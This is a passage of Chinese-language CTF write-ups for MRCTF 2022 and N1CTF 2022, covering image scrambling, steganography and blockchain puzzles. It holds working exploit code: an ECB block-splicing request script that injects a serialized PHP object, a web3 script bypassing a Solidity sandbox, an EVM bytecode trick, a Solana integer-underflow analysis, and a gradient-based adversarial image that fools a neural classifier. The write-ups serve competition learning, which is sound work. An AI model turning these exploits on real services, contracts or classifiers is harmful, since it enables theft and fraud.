ZigZag(data):\n    lst = zigzag(data)\n    k = 0\n    ret = np.zeros(data.shape)\n    row, col = data.shape\n    for i in range(row):\n        for j in range(col):\n            ret[i][j] = lst[k]\n            k += 1\n    return ret\n\ndef deZigZag(data):\n    lst = []\n    row, col = data.shape\n    for i in range(row):\n        for j in range(col):\n            lst.append(data[i][j])\n    ret = dezigzag(lst)\n    return ret\n\nimg = Image.open(\"XXX\").convert(\"L\")\narr = np.array(img)\n#for i in range(64):\n    #for j in range(64):\n        # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8])\n        #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8])\narr[0:512,0:512] = deZigZag(arr[0:512, 0:512])\nimg2 = Image.fromarray(arr, \"L\")\nimg2.show()\nimg2.save(\"XXX\")\n</code></pre> <p></p> <p>\u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22</p> cat map <pre><code>import os\n\nfrom PIL.Image import open as load_pic, new as new_pic\n\ndef main(path, iterations, keep_all=False, name=XXX):\n    title = os.path.splitext(os.path.split(path)[1])[0]\n    ppath=path\n    counter = 0\n    while counter &lt; iterations:\n        with load_pic(path) as image:\n            dim = width, height = image.size\n            with new_pic(image.mode, dim) as canvas:\n                for x in range(width):\n                    for y in range(height):\n                        nx = (441 * x + 20 * y) % width\n                        ny = (22 * x + 1 * y) % height\n                        canvas.putpixel((nx, height-ny-1), image.getpixel((x, height-y-1)))\n        if counter &gt; 0 and not keep_all:\n            os.remove(path)\n        counter += 1\n        print(counter, end=\"\\r\")\n        path = name.format(name=title, index=counter)\n        canvas.save(path)\n\n    return canvas\n\nresult = main(XXX, 512, True)\nresult.show()\n</code></pre> <p></p> <p>flag: MRCTF{f8e49887132bf8977a161472781b718c}</p>"},{"location":"writeups/mrctf2022/#spy_dog","title":"Spy_Dog","text":"<p>\u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002</p> <p>\u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1ahttps://www.likecs.com/show-915984.html</p> <p>\u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9</p> exp <pre><code># %%\nfrom keras.models import load_model\nimport cv2\nimport numpy as np\nfrom keras.preprocessing import image\nfrom keras.applications import inception_v3\nfrom keras import backend as K\nfrom PIL import Image\nimport tensorflow as tf\ntf.compat.v1.disable_eager_execution()\n\n# %%\nmodel = load_model(\"simplenn.model\")\n\n# %%\n# Grab a reference to the first and last layer of the neural net\nmodel_input_layer = model.layers[0].input\nmodel_output_layer = model.layers[-1].output\n\nobject_type_to_fake = 1\n\n# Load the image to hack\nimg = cv2.imread(\"dog.bmp\")\noriginal_image = img.astype(np.float32)\n\n# Scale the image so all pixel intensities are between [-1, 1] as the model expects\noriginal_image /= 255.\n\n# Add a 4th dimension for batch size (as Keras expects)\noriginal_image = np.expand_dims(original_image, axis=0)\n\n# Pre-calculate the maximum change we will allow to the image\n# We\\'ll make sure our hacked image never goes past this so it doesn\\'t look funny.\n# A larger number produces an image faster but risks more distortion.\nmax_change_above = original_image + (9.4/255.)\nmax_change_below = original_image - (9.4/255.)\n\n# Create a copy of the input image to hack on\nhacked_image = np.copy(original_image)\n\n# How much to update the hacked image in each iteration\nlearning_rate = 0.1\n\n# Define the cost function.\n# Our \\'cost\\' will be the likelihood out image is the target class according to the pre-trained model\ncost_function = model_output_layer[0, object_type_to_fake]\n\n# We\\'ll ask Keras to calculate the gradient based on the input image and the currently predicted class\n# In this case, referring to \"model_input_layer\" will give us back image we are hacking.\ngradient_function = K.gradients(cost_function, model_input_layer)[0]\n\n# Create a Keras function that we can call to calculate the current cost and gradient\ngrab_cost_and_gradients_from_model = K.function([model_input_layer, K.learning_phase()], [cost_function, gradient_function])\n\ncost = 0.0\n\n# In a loop, keep adjusting the hacked image slightly so that it tricks the model more and more\n# until it gets to at least 80% confidence\nwhile cost &lt; 0.9995:\n    # Check how close the image is to our target class and grab the gradients we\n    # can use to push it one more step in that direction.\n    # Note: It\\'s really important to pass in \\'0\\' for the Keras learning mode here!\n    # Keras layers behave differently in prediction vs. train modes!\n    cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0])\n\n    # Move the hacked image one step further towards fooling the model\n    hacked_image += gradients * learning_rate\n\n    # Ensure that the image doesn\\'t ever change too much to either look funny or to become an invalid image\n    hacked_image = np.clip(hacked_image, max_change_below, max_change_above)\n    hacked_image = np.clip(hacked_image, -1.0, 1.0)\n\n    print(\"Model\\'s predicted likelihood that the image is a cat: {:.8}%\".format(cost * 100))\n\n# De-scale the image\\'s pixels from [-1, 1] back to the [0, 255] range\nimg = hacked_image[0].copy()\nimg *= 255.\n\n# Save the hacked image!\ncv2.imwrite('hacked.bmp', img.astype(np.uint8))\n\n# %% check\nmodel = load_model(\"simplenn.model\")\n\ndef checkMask(model, img):\n    predict = model.predict(img)\n    return predict[0][1]\n\ndef checkSkin(img1, img2):\n    output = []\n    for i in range(0, len(img1)):\n        for j in range(0, len(img1[i])):\n            output.append(img2[i][j]-img1[i][j])\n    maxnum = 0\n    for i in output:\n        num = 0\n        for j in i:\n            if j &gt;= 200:\n                j = 255 - j\n            num = j\n            if num &gt;= maxnum:\n                maxnum = num\n                index = i\n    print(index)\n    print(maxnum)\n    if maxnum &gt; 10:\n        return 0\n    else:\n        return 1\n\nscore = 0\nimg = cv2.imread('hacked.bmp')\nscore += checkSkin(img, cv2.imread(\"dog.bmp\"))\nimg = cv2.resize(img, (128, 128))\nimg_tensor = np.expand_dims(img, axis=0)\nimg_tensor = img_tensor.astype(np.float32)\nimg_tensor /= 255.\nscore += checkMask(model, img_tensor)\nprint(score)\n</code></pre> <p>flag: MRCTF{A_D0g_W1th_Br1lli4nt_Tric7}</p>"},{"location":"writeups/mrctf2022/#pdd","title":"pdd","text":"<p>\u65e0\u6cd5\u4f2a\u9020 ip \u8fdb\u884c\u52a9\u529b\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u8d8b\u8fd1 100 \u800c\u4e0d\u4f1a\u7b49\u4e8e</p> <p>\u6ce8\u610f\u5230\u9664\u88ab\u52a9\u529b\u6b21\u6570\u4ee5\u5916\u7684\u6570\u636e\u90fd\u662f\u5b58\u5728\u5ba2\u6237\u7aef\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e0a\u7684\uff0c\u5c1d\u8bd5\u63a7\u5236 name \u751f\u6210\u51fa\u76ee\u6807 enc \u5373\u53ef\uff08\u53ef\u5728 debug \u4e0a\u770b\u5230\u89e3\u5bc6\u7ed3\u679c\uff09</p> <p>\u7b80\u5355\u5c1d\u8bd5\u53ef\u77e5\u52a0\u5bc6\u662f\u5e26 pad \u7684\u6bcf 16 \u5b57\u8282\u8fdb\u884c ECB \u52a0\u5bc6\u7684\u672a\u77e5\u52a0\u5bc6\u3002\uff08\u7c7b\u4f3c AES-256-ECB\uff09</p> <pre><code>let enc1 = await fetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=start\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({username: 'user_tpHRGt11111111111111'}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; x.enc);\n\nlet enc2 = await fetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=start\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({username: '111111111111' + 'O:4:\"User\":3:{s:8:\"username\";s:22:\"user_tpHRGt11111111111\";s:5:\"times\";i:110;s:5:\"money\";d:100;}'}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; x.enc);\n\nfetch(\"https://ppd.node3.mrctf.fun/lucky.php?action=getFlag\", {\n  \"headers\": {\n    \"content-type\": \"application/json\"\n  },\n  \"body\": JSON.stringify({enc: btoa(atob(enc2).slice(48).slice(0, target.length)+atob(enc1).slice(-16))}),\n  \"method\": \"POST\"\n}).then(x =&gt; x.json()).then(x =&gt; {\n    console.log(x.flag);\n})\n</code></pre> <p>flag: MRCTF{Xi_Xi0ngDi_9_Na_Kan_w0!}</p>"},{"location":"writeups/mrctf2022/#sandsandsand","title":"SandSandSand","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.7.0;\n\ncontract checktheCode {\n    function checks(address a) public {\n        uint256 size;\n        assembly {\n            size := extcodesize(a)\n        }\n        require(size &lt; 0x10);\n    }\n}\n\ncontract BabySandbox {\n    event SendFlag(address);\n    checktheCode public A;\n\n    constructor() public {\n        A = new checktheCode();\n    }\n\n    function run(address code) external payable {\n        bool success;\n        bytes memory result;\n        (success, result) = address(A).call(\n            abi.encodeWithSignature(\"checks(address)\", code)\n        );\n        require(success == true);\n        assembly {\n            if eq(caller(), address()) {\n                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)\n                case 0 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    revert(0x00, returndatasize())\n                }\n                case 1 {\n                    returndatacopy(0x00, 0x00, returndatasize())\n                    return(0x00, returndatasize())\n                }\n            }\n\n            if lt(gas(), 0xB000) {\n                revert(0x00, 0x00)\n            }\n\n            calldatacopy(0x00, 0x00, calldatasize())\n\n            if eq(staticcall(0x5000, address(), 0, calldatasize(), 0, 0), 1) {\n                revert(0x00, 0x00)\n            }\n\n            if eq(call(0x5000, address(), 0, 0, calldatasize(), 0, 0), 0) {\n                revert(0x00, 0x00)\n            }\n        }\n        emit SendFlag(msg.sender);\n    }\n}\n</code></pre> <p>\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u5c31\u662f\u8981\u7528 0x5000 \u7684 gas \u8c03\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5408\u7ea6\uff0c\u8981\u6c42 staticcall \u8c03\u7528\u4f1a\u5931\u8d25\uff0ccall \u4f1a\u6210\u529f\uff0c\u5e76\u4e14\u5408\u7ea6\u5b57\u8282\u7801\u5728 0x10 \u4ee5\u5185</p> <p>\u76f4\u63a5\u5728\u5408\u7ea6\u4e2d\u6267\u884c\u4e00\u6b21 sstore \u5c31\u53ef\u4ee5\u8ba9 staticcall \u6302\u6389\uff0cyul \u5408\u7ea6\uff1a</p> <pre><code>object \"DeleCaller\" {\n  code {\n    sstore(0, 0)\n    datacopy(0, dataoffset(\"Runtime\"), datasize(\"Runtime\"))\n    return(0, datasize(\"Runtime\"))\n  }\n  object \"Runtime\" {\n    code {\n      sstore(0, 0)\n      stop()\n    }\n  }\n}\n</code></pre> <p>\u6216\u8005\u624b\u5199\u6c47\u7f16\uff1a</p> <pre><code>; \u524d\u9762\u5957\u4e00\u5c42 creationCode\nPUSH1 0x00 ; 6000\nPUSH1 0x00 ; 6000\nSSTORE     ; 55\nSTOP       ; 00\n</code></pre> exp <pre><code>from web3 import Web3\n\nw3 = Web3(Web3.HTTPProvider('http://retr0.vip:8545'))\n\nhacker = '...'\ntarget = '...'\nprivateKey = '...'\n\ndef get_txn(src, dst, data, value=0, gas=0x200000):\n    return {\n        \"chainId\": 0x4bb,\n        \"from\": src,\n        \"to\": dst,\n        \"gasPrice\": w3.toWei(1.1, 'gwei'),\n        \"gas\": gas,\n        \"value\": w3.toWei(value, 'ether'),\n        \"nonce\": w3.eth.getTransactionCount(src),\n        \"data\": data\n    }\n\ndata = get_txn(hacker, None, bytes.fromhex(\"60006000556006601160003960066000f3600060005500\"))\ntransaction = w3.eth.account.signTransaction(data, privateKey).rawTransaction\ntxn_hash = w3.eth.sendRawTransaction(transaction).hex()\ntxn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\nprint(txn_receipt)\n\ncontractAddress = txn_receipt['contractAddress']\n\ndata = get_txn(hacker, target, bytes.fromhex(\"522bb704000000000000000000000000\" + contractAddress[2:]))\ntransaction = w3.eth.account.signTransaction(data, privateKey).rawTransaction\ntxn_hash = w3.eth.sendRawTransaction(transaction).hex()\ntxn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\nprint(txn_receipt)\n</code></pre> <p>flag: MRCTF{TheShor7testShel1c0dE&amp;EIP-2929}</p>"},{"location":"writeups/mrctf2022/#jop_gadget","title":"JOP_Gadget","text":"<p>\u9898\u76ee\u7684\u610f\u601d\u5c31\u662f\u4f1a\u5148\u628a\u8f93\u5165 PUSH2 \u8fdb\u53bb\uff0c\u7136\u540e\u6267\u884c\uff0c\u5f00\u5934\u4f1a\u5148 JUMP</p> <p>\u770b\u5230\u51fa\u9898\u4eba\u7ed9\u7684\u6570\u636e\u89e3\u6790\u53ef\u4ee5\u53d1\u73b0\u6ca1\u6709\u68c0\u67e5\u957f\u5ea6</p> <p></p> <p>\u6240\u4ee5\u5982\u679c\u8f93\u5165\u7684\u957f\u5ea6\u5e76\u4e0d\u662f uint16\uff0c\u90a3\u4e48\u540e\u9762\u7684\u5c31\u4f1a\u88ab\u5f53\u6210\u6b63\u5e38\u7684\u5b57\u8282\u7801\u6765\u8fd0\u884c\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u4e00\u4e2a 16 \u4f4d padding \u540e\u9762\u63a5\u4e0a\u6b63\u5e38\u8fd4\u56de 1 \u7684\u5b57\u8282\u7801\u5c31\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u76f4\u63a5\u8fd4\u56de 1</p> <p>\u4f8b\u5982 <code>0x123450600160805260206080f300</code> \u4e5f\u5c31\u53d8\u6210\u4e86\uff1a <pre><code>PUSH2 1234\nPOP\nPUSH1 0x01\nPUSH1 0x80\nMSTORE\nPUSH1 0x20\nPUSH1 0x80\nRETURN\nSTOP\n</code></pre></p> <p>flag: MRCTF{You_4r3_7hE_master_0f_F1nD1ng_G4g3t_0r_t73_K1ng_07_the_vuln_guesser&amp;F0under}</p>"},{"location":"writeups/mrctf2022/#bleach","title":"Bleach!","text":"<p>\u8d5b\u540e\u8865\u505a\u7684\u9898</p> <p>\u6d41\u91cf\u5206\u6790\u770b\u5230\u4e00\u5806 UDP \u534f\u8bae\u548c OICQ \u534f\u8bae</p> <p>\u5728\u8d5b\u540e\u770b\u4e86 nano \u7684 wp \u540e\u77e5\u9053\u90a3\u4e00\u5927\u5806 UDP \u662f\u5728 UDP \u57fa\u7840\u4e0a\u7684 RTP \u534f\u8bae\uff0c\u8981\u5728 wireshark \u91cc decode as RTP \u624d\u80fd\u663e\u793a\u4e3a RTP \u6d41</p> <p>\u7136\u540e\u901a\u8fc7 wireshark \u7684 RTP \u6d41\u64ad\u653e\u5668\u5bfc\u51fa\u97f3\u9891 raw \u6587\u4ef6\uff0c\u5728 Au \u4e2d\u6253\u5f00\uff0c\u6839\u636e\u9898\u76ee\u63cf\u8ff0\u7684\u63d0\u793a\uff0c\u5e94\u8be5\u662f 44100Hz\u300116 \u4f4d PCM \u7f16\u7801\uff0c\u6253\u5f00\u540e\u53ef\u4ee5\u542c\u5230\u6e05\u6670\u6b4c\u66f2\u58f0\u97f3</p> <p>\u518d\u7531\u9898\u76ee\u63cf\u8ff0\u4e2d\u7684 picture in music \u60f3\u5230 lsb\uff0c\u4ee5\u53ca 400*400 \u7684\u56fe\u7247\u5927\u5c0f\u3002\u6240\u4ee5\u5b58\u4e3a wav \u540e\u8bfb\u53d6\uff0c\u63d0\u53d6 lsb \u8f6c\u4e3a\u56fe\u7247</p> <p>\u56e0\u4e3a\u5b58\u4e0b\u6765\u7684 wav \u662f 16 \u4f4d\u6574\u6570\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u89c6\u4e3a\u4e24\u4e2a 8 \u4f4d\u6574\u6570\uff0c\u5206\u522b\u63d0\u53d6 lsb\uff0c\u4e00\u5171\u9700\u8981 400*400/2 \u5e27\uff1a</p> exp <pre><code>import wave\nfrom PIL import Image\n\nf = wave.open(\"bleach.wav\", \"rb\")\n\nframes = f.readframes(400*400//2)\nres = [255 if frame &amp; 1 else 0 for frame in frames]\n\nimg = Image.new(\"L\", (400, 400))\nk = 0\nfor i in range(400):\n    for j in range(400):\n        img.putpixel((j, i), res[k])\n        k += 1\nimg.show()\nimg.save(\"flag.png\")\n</code></pre> <p></p> <p>flag: MRCTF{Don\u2019t_Use_Your_tools!}</p>"},{"location":"writeups/n1ctf2022/","title":"N1CTF 2022 Writeup","text":"<p> \u7ea6 2683 \u4e2a\u5b57  838 \u884c\u4ee3\u7801  5 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u4e3b\u8981\u505a\u4e86\u4e0b blockchain\uff0cmisc \u6709\u4e2a\u5185\u5b58\u53d6\u8bc1\u5dee\u4e00\u70b9\u505a\u51fa\u6765\uff0c\u4e5f\u5728\u8fd9\u91cc\u8bb0\u4e00\u4e0b</p> <p>\u542c\u8bf4\u8fd9\u6b21\u7684 blockchain \u4f1a\u8bbe\u5355\u9879\u5956\uff0c\u5e94\u8be5\u5f88\u6709\u8d28\u91cf\u3002\u6ca1\u60f3\u5230\u662f\u6ca1\u63a5\u89e6\u8fc7\u7684 solana \u533a\u5757\u94fe\uff0c\u7b2c\u4e00\u6b21\u73a9\uff0c\u8fd8\u633a\u6709\u610f\u601d\u7684\uff0c\u800c\u4e14\u9898\u7ed9\u7684\u505a\u9898\u6846\u67b6\u4e5f\u5f88\u5168\uff0c\u8fd8\u7b97\u5f88\u8212\u9002</p> <p>\u611f\u89c9 solana \u8fd8\u662f\u6709\u5f88\u591a\u9700\u8981\u4e86\u89e3\u7684\u57fa\u7840\u77e5\u8bc6\u8fd8\u662f\u5f88\u591a\u7684\uff0c\u6709\u65f6\u95f4\u4ee5\u540e\u7cfb\u7edf\u5b66\u4e60\u7684\u65f6\u5019\u518d\u8bb0\u5f55\u5427</p>"},{"location":"writeups/n1ctf2022/#utility-payment-service","title":"Utility Payment Service","text":"<p>solana \u7684\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\u5f88\u590d\u6742\uff0c\u9644\u4ef6\u4e5f\u662f\u5b8c\u6574\u7684 cargo \u5de5\u4f5c\u533a\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u5168\u5217\u51fa\u6765\u4e86\u3002</p> processor \u90e8\u5206 <pre><code>use borsh::{BorshDeserialize, BorshSerialize};\n\nuse solana_program::{\n    account_info::{next_account_info, AccountInfo},\n    entrypoint::ProgramResult,\n    msg,\n    program::{invoke, invoke_signed},\n    pubkey::Pubkey,\n    system_instruction,\n};\n\nuse crate::{Escrow, ServiceInstruction, ESCROW_ACCOUNT_SIZE};\n\npub fn process_instruction(\n    program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    mut data: &amp;[u8],\n) -&gt; ProgramResult {\n    match ServiceInstruction::deserialize(&amp;mut data)? {\n        ServiceInstruction::Init {} =&gt; init_escrow(program, accounts),\n        ServiceInstruction::DepositEscrow { amount } =&gt; deposit_escrow(program, accounts, amount),\n        ServiceInstruction::WithdrawEscrow {} =&gt; withdraw_escrow(program, accounts),\n        ServiceInstruction::Pay { amount } =&gt; pay_utility_fees(program, accounts, amount),\n    }\n}\n\npub fn get_escrow(program: Pubkey, user: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"ESCROW\".as_bytes(), &amp;user.to_bytes()], &amp;program)\n}\n\npub fn get_reserve(program: Pubkey) -&gt; (Pubkey, u8) {\n    Pubkey::find_program_address(&amp;[\"RESERVE\".as_bytes()], &amp;program)\n}\n\n\n///\n/// init escrow\n///\nfn init_escrow(program: &amp;Pubkey, accounts: &amp;[AccountInfo]) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let _reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    assert!(escrow_account.data_is_empty());\n    let (expected_escrow, escrow_bump) = get_escrow(*program, *user.key);\n\n    invoke_signed(\n    &amp;system_instruction::create_account(\n        &amp;user.key,\n        &amp;expected_escrow,\n        1,\n        ESCROW_ACCOUNT_SIZE as u64,\n        &amp;program,\n    ),\n    &amp;[user.clone(), escrow_account.clone(), sys_prog.clone()],\n    &amp;[&amp;[\"ESCROW\".as_bytes(), &amp;user.key.to_bytes(), &amp;[escrow_bump]]],\n    )?;\n\n    let escrow_data = Escrow {\n        user: *user.key,\n        amount: 0,\n        bump: escrow_bump,\n    };\n\n    escrow_data.serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..]).unwrap();\n\n    Ok(())\n}\n\n///\n/// deposit escrow\n///\nfn deposit_escrow(\n    program: &amp;Pubkey,\n    accounts: &amp;[AccountInfo],\n    deposit_amount: u16,\n) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, _reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    invoke(\n        &amp;system_instruction::transfer(&amp;user.key, &amp;reserve.key, deposit_amount as u64),\n        &amp;[\n            user.clone(),\n            reserve.clone(),\n            sys_prog.clone()\n        ],\n    )?;\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n    escrow_data.amount += deposit_amount;\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\n///\n/// withdraw all balance in escrow\n///\nfn withdraw_escrow(program: &amp;Pubkey, accounts: &amp;[AccountInfo]) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n    let balance = escrow_data.amount;\n    invoke_signed(\n        &amp;system_instruction::transfer(&amp;reserve.key, &amp;user.key, balance as u64),\n        &amp;[user.clone(), reserve.clone(), sys_prog.clone()],\n        &amp;[&amp;[\"RESERVE\".as_bytes(), &amp;[reserve_bump]]],\n    )?;\n\n    escrow_data.amount = 0;\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n\n///\n/// pay utility\n///\nfn pay_utility_fees(program: &amp;Pubkey, accounts: &amp;[AccountInfo], amount: u16) -&gt; ProgramResult {\n    let account_iter = &amp;mut accounts.iter();\n\n    let user = next_account_info(account_iter)?;\n    let reserve = next_account_info(account_iter)?;\n    let escrow_account = next_account_info(account_iter)?;\n    let _sys_prog = next_account_info(account_iter)?;\n\n    assert!(user.is_signer);\n    let (expected_reserve, _reserve_bump) = get_reserve(*program);\n    assert_eq!(expected_reserve, *reserve.key);\n    let (expected_escrow, _escrow_bump) = get_escrow(*program, *user.key);\n    assert_eq!(expected_escrow, *escrow_account.key);\n\n    let escrow_data = &amp;mut Escrow::deserialize(&amp;mut &amp;(*escrow_account.data).borrow_mut()[..])?;\n\n    let base_fee = 15_u16;\n    if escrow_data.amount &gt;= 10 {\n        if amount &lt; base_fee {\n            escrow_data.amount -= base_fee;\n        } else {\n            assert!(escrow_data.amount &gt;= amount);\n            escrow_data.amount -= amount;\n        }\n    } else {\n        msg!(\"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\");\n    }\n\n    escrow_data\n        .serialize(&amp;mut &amp;mut (*escrow_account.data).borrow_mut()[..])\n        .unwrap();\n\n    Ok(())\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u4e3b\u8981\u6709\u4e09\u4e2a\u65b9\u6cd5\uff1a</p> <ul> <li>Init\uff1a\u521d\u59cb\u5316\u5e76\u7b7e\u540d escrow</li> <li>DepositEscrow\uff1a\u5b58\u5165 deposit_amount \u91d1\u989d<ul> <li>\u5c06\u94b1\u8f6c\u5165 reserve account\uff08\u53ea\u7531 program seed \u751f\u6210\uff09</li> <li>\u5c06\u7528\u6237\u5bf9\u5e94 escrow account\uff08\u7531 program \u548c user.key \u7684 seed \u5408\u6210\u751f\u6210\uff09\u7684 amount \u589e\u52a0 deposit_amout</li> </ul> </li> <li>WithdrawEscrow\uff1a\u5c06 escrow \u8bb0\u5f55\u7684\u6240\u6709\u91d1\u989d\u90fd\u8f6c\u56de\u7ed9\u7528\u6237<ul> <li>\u4ece reserve account \u8f6c\u51fa</li> </ul> </li> <li>Pay\uff1a\u652f\u4ed8\uff0c\u4e5f\u5c31\u662f\u51cf\u5c11\u7528\u6237 escrow \u7684 amount\u3002\u8fd8\u662f\u770b\u4ee3\u7801\u66f4\u6e05\u6670\uff1a     <pre><code>let base_fee = 15_u16;\nif escrow_data.amount &gt;= 10 {\n    if amount &lt; base_fee {\n        escrow_data.amount -= base_fee;\n    } else {\n        assert!(escrow_data.amount &gt;= amount);\n        escrow_data.amount -= amount;\n    }\n} else {\n    msg!(\"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\");\n}\n</code></pre></li> </ul> <p>\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u9690\u60a3\u662f u16\uff0c\u4e5f\u5c31\u662f 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u3002\u518d\u56de\u5934\u770b lib.rs \u4e2d\u89c4\u5b9a\u7684 Escrow account \u7ed3\u6784\u4f53\uff1a <pre><code>#[repr(C)]\n#[derive(BorshSerialize, BorshDeserialize)]\npub struct Escrow {\n    pub user: Pubkey,\n    pub amount: u16,\n    pub bump: u8,\n}\n</code></pre> \u8fd9\u91cc\u7684 amount \u4e5f\u662f u16\uff0c\u5b58\u5728\u6574\u578b\u6ea2\u51fa\u98ce\u9669\u3002</p> <p>\u63a5\u7740\u770b main.rs \u4e2d\u7684\u9898\u76ee\u90e8\u5206\uff1a</p> \u9898\u76ee\u4ea4\u4e92\u90e8\u5206 <pre><code>fn handle_connection(mut socket: TcpStream) -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {\n    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n    // load programs\n    let solve_pubkey = builder.input_program().unwrap();\n    let program_pubkey = builder.chall_programs(&amp;[\"./utility_payment.so\"])[0];\n\n    // make user\n    let user = Keypair::new();\n\n    writeln!(socket, \"program pubkey: {}\", program_pubkey)?;\n    writeln!(socket, \"solve pubkey: {}\", solve_pubkey)?;\n    writeln!(socket, \"user pubkey: {}\", user.pubkey())?;\n\n    // println!(\"program: {}\", program_pubkey);\n\n    // add accounts and lamports\n    let (reserve, _) = get_reserve(program_pubkey);\n    // let (escrow, _) =  get_escrow(program_pubkey, user.pubkey());\n\n    const TARGET_AMT: u64 = 60_000;\n    const INIT_BAL: u64 = 50;\n    const RESERVE_BAL: u64 = 1_000_000;\n\n    builder\n        .builder\n        .add_account_with_lamports(user.pubkey(), system_program::ID, INIT_BAL);\n    builder\n        .builder\n        .add_account_with_lamports(reserve, system_program::ID, RESERVE_BAL);\n\n    let mut challenge = builder.build();\n\n    let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\n    writeln!(socket, \"user lamport before: {:?}\", balance)?;\n\n    // run solve\n    challenge.input_instruction(solve_pubkey, &amp;[&amp;user]).unwrap();\n\n    // check solve\n    let balance = challenge.env.get_account(user.pubkey()).unwrap().lamports;\n    writeln!(socket, \"user lamport after: {:?}\", balance)?;\n\n    if balance &gt; TARGET_AMT {\n        let flag = fs::read_to_string(\"flag.txt\").unwrap();\n        writeln!(\n            socket,\n            \"Flag: {}\",\n            flag\n        )?;\n    }\n\n    Ok(())\n}\n</code></pre> <p>\u7b2c\u4e00\u6b21\u63a5\u89e6 solana \u9898\u76ee\uff0c\u6240\u4ee5\u9010\u6b65\u89e3\u6790\u4e00\u4e0b\uff1a</p> <ul> <li>\u521b\u5efa\u4e00\u4e2a builder \u5e76\u83b7\u53d6\u7528\u6237\u5408\u7ea6\u4ee5\u53ca\u9898\u76ee\u5408\u7ea6\uff08ChallengeBuilder \u6765\u81ea sol-ctf-framework\uff09\uff1a     <pre><code>let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n// load programs\nlet solve_pubkey = builder.input_program().unwrap();\nlet program_pubkey = builder.chall_programs(&amp;[\"./utility_payment.so\"])[0];\n</code></pre><ul> <li>\u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u662f\u4e00\u4e2a solana 